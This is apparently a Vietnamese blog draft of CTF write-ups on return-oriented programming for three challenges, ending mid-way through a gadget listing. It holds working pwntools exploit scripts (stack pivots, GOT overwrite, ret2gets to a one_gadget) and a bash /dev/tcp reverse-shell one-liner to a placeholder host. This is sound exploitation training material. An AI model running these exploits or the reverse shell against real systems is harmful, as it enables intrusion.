---
title: "ROP-writeup"
date: 2025-02-11 00:00:00 +0800
categories: [pwn]
tags: [rop]
author: "kuvee"
layout: post
published: false
---


- đây sẽ là writeup những bài rop thú vị mà mình tìm được ^^

## ropity

- checksec: 

```cs
ploi@PhuocLoiiiii:~/pwn/ROP/ropity$ checksec vuln
[*] '/home/ploi/pwn/ROP/ropity/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- main : 1 challenge với một bug ```bof``` có thể thấy rõ 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[8]; // [rsp+8h] [rbp-8h] BYREF

  return (unsigned int)fgets(s, 256, _bss_start);
}
```

- printfile : ta thấy hàm này sẽ nhận đối số cho a1 và a3 với syscall ```open``` tiếp theo đó là sendfile (read+ write) 

```c
signed __int64 __fastcall printfile(const char *a1, __int64 a2, int a3)
{
  int v3; // esi
  size_t v4; // r10

  v3 = sys_open(a1, 0, a3);
  return sys_sendfile(1, v3, 0LL, v4);
}
```

- target bài này rất rõ ràng , ta cần control được ```rdi``` với giá trị là path chứa flag của ta -> ```open('./flag,0,0)```  
- tuy nhiên ở bài này không có gadged ```pop_rdi``` và tất nhiên ta cũng không thể leak libc và thực hiện ret2libc thành công được

```cs
ploi@PhuocLoiiiii:~/pwn/ROP/ropity$ ropper -f vuln
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x000000000040106c: adc dword ptr [rax], eax; call qword ptr [rip + 0x2f7b]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010de: adc dword ptr [rax], edi; test rax, rax; je 0x10f0; mov edi, 0x404030; jmp rax;
0x000000000040106b: adc dword ptr ss:[rax], eax; call qword ptr [rip + 0x2f7b]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401070: adc eax, 0x2f7b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040109c: adc edi, dword ptr [rax]; test rax, rax; je 0x10b0; mov edi, 0x404030; jmp rax;
0x000000000040110c: adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x1090; mov byte ptr [rip + 0x2f1b], 1; pop rbp; ret;
0x0000000000401074: add ah, dh; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040116c: add al, byte ptr [rax]; add byte ptr [rax], al; mov rsi, 0; syscall;
0x000000000040106e: add bh, bh; adc eax, 0x2f7b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040116f: add byte ptr [rax - 0x39], cl; mov byte ptr [rax], 0; add byte ptr [rax], al; syscall;
0x0000000000401182: add byte ptr [rax - 0x39], cl; ret 0;
0x0000000000401190: add byte ptr [rax - 0x39], cl; shr byte ptr [rax], 0; add byte ptr [rax], al; syscall;
0x000000000040100e: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x000000000040116d: add byte ptr [rax], al; add byte ptr [rax - 0x39], cl; mov byte ptr [rax], 0; add byte ptr [rax], al; syscall;
0x0000000000401180: add byte ptr [rax], al; add byte ptr [rax - 0x39], cl; ret 0;
0x0000000000401186: add byte ptr [rax], al; add byte ptr [rax], al; mov r8, 0x100; mov rax, 0x28; syscall;
0x000000000040109e: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x10b0; mov edi, 0x404030; jmp rax;
0x00000000004010e0: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x10f0; mov edi, 0x404030; jmp rax;
0x000000000040107c: add byte ptr [rax], al; add byte ptr [rax], al; endbr64; ret;
0x0000000000401173: add byte ptr [rax], al; add byte ptr [rax], al; syscall;
0x0000000000401187: add byte ptr [rax], al; add byte ptr [rcx - 0x39], cl; rol byte ptr [rax], 1; add byte ptr [rax], al; mov rax, 0x28; syscall;
0x0000000000401188: add byte ptr [rax], al; mov r8, 0x100; mov rax, 0x28; syscall;
0x000000000040118f: add byte ptr [rax], al; mov rax, 0x28; syscall;
0x0000000000401150: add byte ptr [rax], al; mov rdi, rax; call 0x1040; nop; leave; ret;
0x0000000000401181: add byte ptr [rax], al; mov rdx, 0; mov r8, 0x100; mov rax, 0x28; syscall;
0x000000000040116e: add byte ptr [rax], al; mov rsi, 0; syscall;
0x000000000040100d: add byte ptr [rax], al; test rax, rax; je 0x1016; call rax;
0x000000000040100d: add byte ptr [rax], al; test rax, rax; je 0x1016; call rax; add rsp, 8; ret;
0x00000000004010a0: add byte ptr [rax], al; test rax, rax; je 0x10b0; mov edi, 0x404030; jmp rax;
0x00000000004010e2: add byte ptr [rax], al; test rax, rax; je 0x10f0; mov edi, 0x404030; jmp rax;
0x000000000040119e: add byte ptr [rax], al; endbr64; sub rsp, 8; add rsp, 8; ret;
0x000000000040107e: add byte ptr [rax], al; endbr64; ret;
0x0000000000401073: add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401175: add byte ptr [rax], al; syscall;
0x0000000000401196: add byte ptr [rax], al; syscall; nop; pop rbp; ret;
0x0000000000401189: add byte ptr [rcx - 0x39], cl; rol byte ptr [rax], 1; add byte ptr [rax], al; mov rax, 0x28; syscall;
0x000000000040118d: add byte ptr [rcx], al; add byte ptr [rax], al; mov rax, 0x28; syscall;
0x000000000040111b: add byte ptr [rcx], al; pop rbp; ret;
0x000000000040106d: add dil, dil; adc eax, 0x2f7b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040118e: add dword ptr [rax], eax; add byte ptr [rax - 0x39], cl; shr byte ptr [rax], 0; add byte ptr [rax], al; syscall;
0x000000000040117f: add dword ptr [rax], eax; add byte ptr [rax], al; mov rdx, 0; mov r8, 0x100; mov rax, 0x28; syscall;
0x000000000040100a: add eax, 0x2fe9; test rax, rax; je 0x1016; call rax;
0x000000000040100a: add eax, 0x2fe9; test rax, rax; je 0x1016; call rax; add rsp, 8; ret;
0x0000000000401178: add eax, 0x48c68948; mov edi, 1; mov rdx, 0; mov r8, 0x100; mov rax, 0x28; syscall;
0x0000000000401017: add esp, 8; ret;
0x0000000000401016: add rsp, 8; ret;
0x0000000000401155: call 0x1040; nop; leave; ret;
0x0000000000401111: call 0x1090; mov byte ptr [rip + 0x2f1b], 1; pop rbp; ret;
0x000000000040106f: call qword ptr [rip + 0x2f7b]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401014: call rax;
0x0000000000401014: call rax; add rsp, 8; ret;
0x0000000000401006: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x2fe9; test rax, rax; je 0x1016; call rax;
0x0000000000401164: in eax, 0x48; mov dword ptr [rbp - 8], edi; mov rax, 2; mov rsi, 0; syscall;
0x0000000000401012: je 0x1016; call rax;
0x0000000000401012: je 0x1016; call rax; add rsp, 8; ret;
0x000000000040109b: je 0x10b0; mov eax, 0; test rax, rax; je 0x10b0; mov edi, 0x404030; jmp rax;
0x00000000004010a5: je 0x10b0; mov edi, 0x404030; jmp rax;
0x00000000004010dd: je 0x10f0; mov eax, 0; test rax, rax; je 0x10f0; mov edi, 0x404030; jmp rax;
0x00000000004010e7: je 0x10f0; mov edi, 0x404030; jmp rax;
0x0000000000401167: jge 0x1161; mov rax, 2; mov rsi, 0; syscall;
0x00000000004010ac: jmp rax;
0x0000000000401071: jnp 0x10a2; add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401172: mov byte ptr [rax], 0; add byte ptr [rax], al; syscall;
0x0000000000401116: mov byte ptr [rip + 0x2f1b], 1; pop rbp; ret;
0x0000000000401166: mov dword ptr [rbp - 8], edi; mov rax, 2; mov rsi, 0; syscall;
0x000000000040117e: mov dword ptr [rcx], 0x48000000; mov edx, 0; mov r8, 0x100; mov rax, 0x28; syscall;
0x000000000040109d: mov eax, 0; test rax, rax; je 0x10b0; mov edi, 0x404030; jmp rax;
0x00000000004010df: mov eax, 0; test rax, rax; je 0x10f0; mov edi, 0x404030; jmp rax;
0x000000000040118b: mov eax, 0x100; mov rax, 0x28; syscall;
0x0000000000401192: mov eax, 0x28; syscall;
0x0000000000401192: mov eax, 0x28; syscall; nop; pop rbp; ret;
0x000000000040116a: mov eax, 2; mov rsi, 0; syscall;
0x0000000000401009: mov eax, dword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax;
0x0000000000401009: mov eax, dword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; add rsp, 8; ret;
0x000000000040110f: mov ebp, esp; call 0x1090; mov byte ptr [rip + 0x2f1b], 1; pop rbp; ret;
0x0000000000401163: mov ebp, esp; mov qword ptr [rbp - 8], rdi; mov rax, 2; mov rsi, 0; syscall;
0x0000000000401069: mov edi, 0x401136; call qword ptr [rip + 0x2f7b]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010a7: mov edi, 0x404030; jmp rax;
0x000000000040117d: mov edi, 1; mov rdx, 0; mov r8, 0x100; mov rax, 0x28; syscall;
0x0000000000401153: mov edi, eax; call 0x1040; nop; leave; ret;
0x0000000000401184: mov edx, 0; mov r8, 0x100; mov rax, 0x28; syscall;
0x0000000000401171: mov esi, 0; syscall;
0x000000000040117a: mov esi, eax; mov rdi, 1; mov rdx, 0; mov r8, 0x100; mov rax, 0x28; syscall;
0x0000000000401165: mov qword ptr [rbp - 8], rdi; mov rax, 2; mov rsi, 0; syscall;
0x000000000040118a: mov r8, 0x100; mov rax, 0x28; syscall;
0x0000000000401191: mov rax, 0x28; syscall;
0x0000000000401191: mov rax, 0x28; syscall; nop; pop rbp; ret;
0x0000000000401169: mov rax, 2; mov rsi, 0; syscall;
0x0000000000401008: mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax;
0x0000000000401008: mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; add rsp, 8; ret;
0x000000000040110e: mov rbp, rsp; call 0x1090; mov byte ptr [rip + 0x2f1b], 1; pop rbp; ret;
0x0000000000401162: mov rbp, rsp; mov qword ptr [rbp - 8], rdi; mov rax, 2; mov rsi, 0; syscall;
0x0000000000401068: mov rdi, 0x401136; call qword ptr [rip + 0x2f7b]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040117c: mov rdi, 1; mov rdx, 0; mov r8, 0x100; mov rax, 0x28; syscall;
0x0000000000401152: mov rdi, rax; call 0x1040; nop; leave; ret;
0x0000000000401183: mov rdx, 0; mov r8, 0x100; mov rax, 0x28; syscall;
0x0000000000401170: mov rsi, 0; syscall;
0x0000000000401179: mov rsi, rax; mov rdi, 1; mov rdx, 0; mov r8, 0x100; mov rax, 0x28; syscall;
0x0000000000401078: nop dword ptr [rax + rax]; endbr64; ret;
0x0000000000401077: nop dword ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401076: nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401007: or byte ptr [rax - 0x75], cl; add eax, 0x2fe9; test rax, rax; je 0x1016; call rax;
0x00000000004010a6: or dword ptr [rdi + 0x404030], edi; jmp rax;
0x000000000040111d: pop rbp; ret;
0x000000000040110d: push rbp; mov rbp, rsp; call 0x1090; mov byte ptr [rip + 0x2f1b], 1; pop rbp; ret;
0x0000000000401161: push rbp; mov rbp, rsp; mov qword ptr [rbp - 8], rdi; mov rax, 2; mov rsi, 0; syscall;
0x0000000000401185: ret 0;
0x000000000040118c: rol byte ptr [rax], 1; add byte ptr [rax], al; mov rax, 0x28; syscall;
0x000000000040116b: rol byte ptr [rdx], 0; add byte ptr [rax], al; mov rsi, 0; syscall;
0x0000000000401011: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x0000000000401193: shr byte ptr [rax], 0; add byte ptr [rax], al; syscall;
0x0000000000401193: shr byte ptr [rax], 0; add byte ptr [rax], al; syscall; nop; pop rbp; ret;
0x0000000000401194: sub byte ptr [rax], al; add byte ptr [rax], al; syscall;
0x0000000000401194: sub byte ptr [rax], al; add byte ptr [rax], al; syscall; nop; pop rbp; ret;
0x00000000004011a5: sub esp, 8; add rsp, 8; ret;
0x0000000000401005: sub esp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax;
0x00000000004011a4: sub rsp, 8; add rsp, 8; ret;
0x0000000000401004: sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax;
0x000000000040107a: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; endbr64; ret;
0x0000000000401010: test eax, eax; je 0x1016; call rax;
0x0000000000401010: test eax, eax; je 0x1016; call rax; add rsp, 8; ret;
0x00000000004010a3: test eax, eax; je 0x10b0; mov edi, 0x404030; jmp rax;
0x00000000004010e5: test eax, eax; je 0x10f0; mov edi, 0x404030; jmp rax;
0x000000000040100f: test rax, rax; je 0x1016; call rax;
0x000000000040100f: test rax, rax; je 0x1016; call rax; add rsp, 8; ret;
0x00000000004010a2: test rax, rax; je 0x10b0; mov edi, 0x404030; jmp rax;
0x00000000004010e4: test rax, rax; je 0x10f0; mov edi, 0x404030; jmp rax;
0x0000000000401168: clc; mov rax, 2; mov rsi, 0; syscall;
0x00000000004011a3: cli; sub rsp, 8; add rsp, 8; ret;
0x0000000000401003: cli; sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax;
0x0000000000401083: cli; ret;
0x00000000004011a0: endbr64; sub rsp, 8; add rsp, 8; ret;
0x0000000000401000: endbr64; sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax;
0x0000000000401080: endbr64; ret;
0x0000000000401075: hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040115b: leave; ret;
0x000000000040119a: nop; pop rbp; ret;
0x000000000040115a: nop; leave; ret;
0x00000000004010af: nop; ret;
0x000000000040101a: ret;
0x0000000000401177: syscall;
0x0000000000401198: syscall; nop; pop rbp; ret;

142 gadgets found
```

- vậy khi bí quá thì mình nghĩ tới pivot thoi :)) , ta sẽ pivot vô ```bss``` , đây là dữ liệu ta có thể control được vì ```PIE``` tắt , ý tưởng của mình là sẽ overwrite ```got``` của ```fgets``` thành hàm ```printfile``` , tại sao lại làm vậy? dữ liệu của ```fgets``` sau khi nhập sẽ trả về rax 
- ta có thể thấy gadget ở bên dưới , nó sẽ mov rax -> rdi  và nếu ta gọi ```fgets``` -> ```printfile``` thì ta hoàn tòan có thể control được con trỏ ```rdi``` đúng không?

```cs
lea     rax, [rbp+s]
mov     esi, 100h       ; n
mov     rdi, rax        ; s
call    _fgets
```

- tuy nhiên đầu tiên ta cần read path của ta vào bss trước , sau đó pivot về got@fgets và overwrite nó bằng ```printfile``` , cuối cùng là pivot lại ```fgets``` : 

exp: 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./vuln',checksec=False)

p = process()
bss = 0x405000-0x20
pivot = 0x0000000000401142
fgets = exe.got.fgets
open_file = 0x000000000040115d

payload = b'a'*16
payload += p64(0x000000000040111d) #pop rbp
payload += p64(bss)
payload += p64(pivot)

input()
p.sendline(payload)
# write flag.txt to bss
p.sendline(b'a'*8 + p64(fgets+8) + p64(pivot) + b'flag.txt\0')

p.sendline(p64(open_file) + p64(0x404ff0+8) + p64(pivot))



p.interactive()
```

## Make Rop Great Again

- 1 bài về ROP nâng cao khá hay ở SECCON13 Quals

checksec: 

```cs
ploi@PhuocLoiiiii:~/pwn/ROP/make-rop-great-again/make-rop-great-again$ checksec chall
[*] '/home/ploi/pwn/ROP/make-rop-great-again/make-rop-great-again/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- đây là hàm main của bài , ta có thể thấy được 1 bug ```BOF``` rất dễ dàng và canary cũng không được bật ở đây

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[16]; // [rsp+0h] [rbp-10h] BYREF

  show_prompt(argc, argv, envp);
  gets(v4);
  return 0;
}
```
- show_prompt 

```C
int show_prompt()
{
  return puts(">");
}
```

- ta có thể dùng ```ropper``` để check các gadget tuy nhiên sẽ không có ```pop rdi,rsi,rdx``` gì vì file được biên dịch ở 1 libc cao và nó sẽ không còn ```libc_csu_init``` nữa

```cs
ploi@PhuocLoiiiii:~/pwn/ROP/make-rop-great-again/make-rop-great-again$ ropper -f chall_patched
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x00000000004010ac: adc dword ptr [rax], eax; call qword ptr [rip + 0x2f3b]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040111e: adc dword ptr [rax], edi; test rax, rax; je 0x3130; mov edi, 0x404010; jmp rax;
0x00000000004010b0: adc eax, 0x2f3b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010dc: adc edi, dword ptr [rax]; test rax, rax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x000000000040114c: adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x30d0; mov byte ptr [rip + 0x2ecb], 1; pop rbp; ret;
0x00000000004010b4: add ah, dh; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010ae: add bh, bh; adc eax, 0x2f3b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040100e: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x00000000004011c6: add byte ptr [rax], al; add byte ptr [rax], al; call 0x3080; mov eax, 0; leave; ret;
0x00000000004011a7: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret;
0x00000000004010de: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x0000000000401120: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x3130; mov edi, 0x404010; jmp rax;
0x00000000004010bc: add byte ptr [rax], al; add byte ptr [rax], al; endbr64; ret;
0x00000000004011d0: add byte ptr [rax], al; add byte ptr [rax], al; leave; ret;
0x0000000000401056: add byte ptr [rax], al; add cl, ch; ret 0xffff;
0x00000000004011d1: add byte ptr [rax], al; add cl, cl; ret;
0x00000000004011c8: add byte ptr [rax], al; call 0x3080; mov eax, 0; leave; ret;
0x000000000040119c: add byte ptr [rax], al; mov rdi, rax; call 0x3070; mov eax, 0; pop rbp; ret;
0x00000000004011a9: add byte ptr [rax], al; pop rbp; ret;
0x000000000040100d: add byte ptr [rax], al; test rax, rax; je 0x3016; call rax;
0x000000000040100d: add byte ptr [rax], al; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010e0: add byte ptr [rax], al; test rax, rax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x0000000000401122: add byte ptr [rax], al; test rax, rax; je 0x3130; mov edi, 0x404010; jmp rax;
0x00000000004010be: add byte ptr [rax], al; endbr64; ret;
0x00000000004010b3: add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004011d2: add byte ptr [rax], al; leave; ret;
0x000000000040115b: add byte ptr [rcx], al; pop rbp; ret;
0x0000000000401058: add cl, ch; ret 0xffff;
0x00000000004011d3: add cl, cl; ret;
0x00000000004010ad: add dil, dil; adc eax, 0x2f3b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040100a: add eax, 0x2fe9; test rax, rax; je 0x3016; call rax;
0x000000000040100a: add eax, 0x2fe9; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x0000000000401017: add esp, 8; ret;
0x0000000000401016: add rsp, 8; ret;
0x00000000004011e0: and byte ptr [rax], al; call 0x3060; nop; pop rbp; ret;
0x00000000004011e3: call 0x3060; nop; pop rbp; ret;
0x00000000004011a1: call 0x3070; mov eax, 0; pop rbp; ret;
0x00000000004011ca: call 0x3080; mov eax, 0; leave; ret;
0x0000000000401151: call 0x30d0; mov byte ptr [rip + 0x2ecb], 1; pop rbp; ret;
0x00000000004010af: call qword ptr [rip + 0x2f3b]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401014: call rax;
0x0000000000401014: call rax; add rsp, 8; ret;
0x00000000004010b1: cmp ebp, dword ptr [rdi]; add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401006: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x2fe9; test rax, rax; je 0x3016; call rax;
0x0000000000401012: je 0x3016; call rax;
0x0000000000401012: je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010db: je 0x30f0; mov eax, 0; test rax, rax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x00000000004010e5: je 0x30f0; mov edi, 0x404010; jmp rax;
0x000000000040111d: je 0x3130; mov eax, 0; test rax, rax; je 0x3130; mov edi, 0x404010; jmp rax;
0x0000000000401127: je 0x3130; mov edi, 0x404010; jmp rax;
0x000000000040103d: jmp qword ptr [rsi - 0x70];
0x00000000004010ec: jmp rax;
0x0000000000401156: mov byte ptr [rip + 0x2ecb], 1; pop rbp; ret;
0x00000000004011c5: mov eax, 0; call 0x3080; mov eax, 0; leave; ret;
0x00000000004011a6: mov eax, 0; pop rbp; ret;
0x00000000004010dd: mov eax, 0; test rax, rax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x000000000040111f: mov eax, 0; test rax, rax; je 0x3130; mov edi, 0x404010; jmp rax;
0x00000000004011cf: mov eax, 0; leave; ret;
0x0000000000401009: mov eax, dword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x0000000000401009: mov eax, dword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x000000000040114f: mov ebp, esp; call 0x30d0; mov byte ptr [rip + 0x2ecb], 1; pop rbp; ret;
0x00000000004011dc: mov ebp, esp; mov edi, 0x402004; call 0x3060; nop; pop rbp; ret;
0x00000000004011de: mov edi, 0x402004; call 0x3060; nop; pop rbp; ret;
0x00000000004010e7: mov edi, 0x404010; jmp rax;
0x000000000040119f: mov edi, eax; call 0x3070; mov eax, 0; pop rbp; ret;
0x00000000004011c3: mov edi, eax; mov eax, 0; call 0x3080; mov eax, 0; leave; ret;
0x0000000000401008: mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x0000000000401008: mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x000000000040114e: mov rbp, rsp; call 0x30d0; mov byte ptr [rip + 0x2ecb], 1; pop rbp; ret;
0x00000000004011db: mov rbp, rsp; mov edi, 0x402004; call 0x3060; nop; pop rbp; ret;
0x000000000040119e: mov rdi, rax; call 0x3070; mov eax, 0; pop rbp; ret;
0x00000000004011c2: mov rdi, rax; mov eax, 0; call 0x3080; mov eax, 0; leave; ret;
0x00000000004010b8: nop dword ptr [rax + rax]; endbr64; ret;
0x00000000004010b7: nop dword ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010b6: nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401007: or byte ptr [rax - 0x75], cl; add eax, 0x2fe9; test rax, rax; je 0x3016; call rax;
0x00000000004010e6: or dword ptr [rdi + 0x404010], edi; jmp rax;
0x000000000040115d: pop rbp; ret;
0x000000000040114d: push rbp; mov rbp, rsp; call 0x30d0; mov byte ptr [rip + 0x2ecb], 1; pop rbp; ret;
0x000000000040105a: ret 0xffff;
0x0000000000401011: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x00000000004011f1: sub esp, 8; add rsp, 8; ret;
0x0000000000401005: sub esp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x00000000004011f0: sub rsp, 8; add rsp, 8; ret;
0x0000000000401004: sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x00000000004010ba: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; endbr64; ret;
0x0000000000401010: test eax, eax; je 0x3016; call rax;
0x0000000000401010: test eax, eax; je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010e3: test eax, eax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x0000000000401125: test eax, eax; je 0x3130; mov edi, 0x404010; jmp rax;
0x000000000040100f: test rax, rax; je 0x3016; call rax;
0x000000000040100f: test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010e2: test rax, rax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x0000000000401124: test rax, rax; je 0x3130; mov edi, 0x404010; jmp rax;
0x00000000004011ef: cli; sub rsp, 8; add rsp, 8; ret;
0x0000000000401003: cli; sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x00000000004010c3: cli; ret;
0x00000000004011ec: endbr64; sub rsp, 8; add rsp, 8; ret;
0x0000000000401000: endbr64; sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x00000000004010c0: endbr64; ret;
0x00000000004010b5: hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004011d4: leave; ret;
0x00000000004011e8: nop; pop rbp; ret;
0x00000000004010ef: nop; ret;
0x000000000040101a: ret;

105 gadgets found
```

- sẽ có rất nhiều cách để làm bài này , ta có thể pivot hoặc tìm được các gadget và kết nối chúng với nhau(đây là 1 quá trình cần sự trãi nghiệm và kiên trì :v) , ta cũng có thể sử dụng ```ret2gets``` 

đây là exp cho ret2gets: 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()

payload = b'a'*16
payload += p64(0)
payload += p64(exe.plt.gets)
payload += p64(exe.plt.gets)
payload += p64(exe.plt.puts)
payload += p64(exe.sym.main)

input()
p.sendlineafter(b'>',payload)
input()
p.sendline(p32(0) + b"A"*4 + b"B"*8)
input()
p.sendline(b"CCCC")

p.recv(8)
p.recv(8)
libc.address = u64(p.recv(6).ljust(8,b'\x00')) + 0x28c0
log.info(f'libc: {hex(libc.address)}')
og = libc.address + 0xef4ce # rbx r12  rbp-0x48 NULL

pl = b'a'*16
pl += p64(0x405000-0x50)
pl += p64(0x00000000000586d4+libc.address) + p64(0)#pop rbx
pl += p64(0x0000000000110951+libc.address) + p64(0)
pl += p64(og)
p.sendline(pl)



p.interactive()
```


## Rop-Revenge


- đây là 1 bài sử dụng gadget khá hay mà mình tìm được nên hôm nay mình sẽ viết lại writeup bài này 

file [here](/assets/files/rop-revenge_HKCERT-2023.rar)


- có rất nhiều kĩ thuật rop đã được ra đời cho đến bây giờ như **ret2shellcode** , **ret2plt** , **ret2csu** , **ret2syscall** ... , nhưng ở bài này author đã thêm 1 số hạn chế vào , ta sẽ cùng xem nó :

```c
int vuln()
{
  _BYTE v1[112]; // [rsp+0h] [rbp-70h] BYREF

  gets(v1);
  close(1);
  return close(2);
}
```

- nhìn qua thì ta thấy 1 lỗi **bof** cơ bản , tuy nhiên điều khó khăn ở đây là ta sẽ không có bất kì hàm win nào , và cũng không có hàm **puts** hoặc **printf** nào để leak libc và hơn nữa là trước khi end ctrinh thì nó cũng đóng **Stdout** và **stderr** 

![here](/assets/images/rop.png)

1 mẹo nhỏ để tắt cảnh báo của alarm : **handle SIGALRM nopass** trong gdb

### EXPLOIT

- đầu tiên ta sẽ nghĩ đến cách mở lại **stdout** vì nếu nó bị đóng thì ta lấy shell cũng không được , [here](https://blog.idiot.sg/2018-09-03/tokyowesterns-ctf-2018-load-pwn/) có 1 cách để lấy là sử dụng **open** để lấy lại **stdout** tuy nhiên ở bài này không có hàm **open** hoặc bất kì gadget **syscall** nào  và ta sẽ tham khảo cách reverse_shell ở bài này [here](https://atum.li/2017/11/08/babyfs/#get-a-shell)

```bash
bash -c 'bash -i >& /dev/tcp/myipaddress/8888 0>&1
```

- tiếp theo ta sẽ tìm 1 cách để lấy shell , ở bài này ta không thể leak libc , mặc dù có thể control được rdi , rsi , rdx , tuy nhiên ta lại không có syscall để thực thi execve('/bin/sh', 0, 0)

- lúc này ta có thể đọc 1 bài viết trên reddit [redit](https://www.reddit.com/r/securityCTF/comments/n3x0ha/is_there_a_way_to_leak_addresses_without_output/) , nó đề cập đến việc lấy shell với điều kiện là không thể leak bất cứ thứ gì , điều kiện của kĩ thuật này là :
  - got có thể ghi 
- nếu 1 địa chỉ của **one_gadget** đủ gần với các địa chỉ got@libc , ta có thể ghi đè 2 bytes và lúc này tỉ lệ thành công là 2^4 (1/16)  
- 1 người khác cũng đề cập rằng anh ấy đã tìm kiếm được 1 gadget hữu ích **add [r14+0x90], r15**  , ta sẽ đặt **r14** thành địa chỉ exe@got-0x90 và **r15** sẽ là độ lệch giữa gots@libc với one_gadget 

- ở đây mình không biết tại sao **ropper** lại không tìm thấy điều này , thay vào đó ta sử dụng **ROPgadget** , nó ở **0x000000000040117c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret** , ta có thể control được cả rbp và rbx trong trường hợp này 

```cs
ploi@PhuocLoiiiii:~/pwn/rop-revenge_HKCERT-2023/chall/src$ ROPgadget --binary chall_patched
Gadgets information
============================================================
0x00000000004010dd : add ah, dh ; nop ; endbr64 ; ret
0x000000000040110b : add bh, bh ; loopne 0x401175 ; nop ; ret
0x00000000004012cc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401256 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
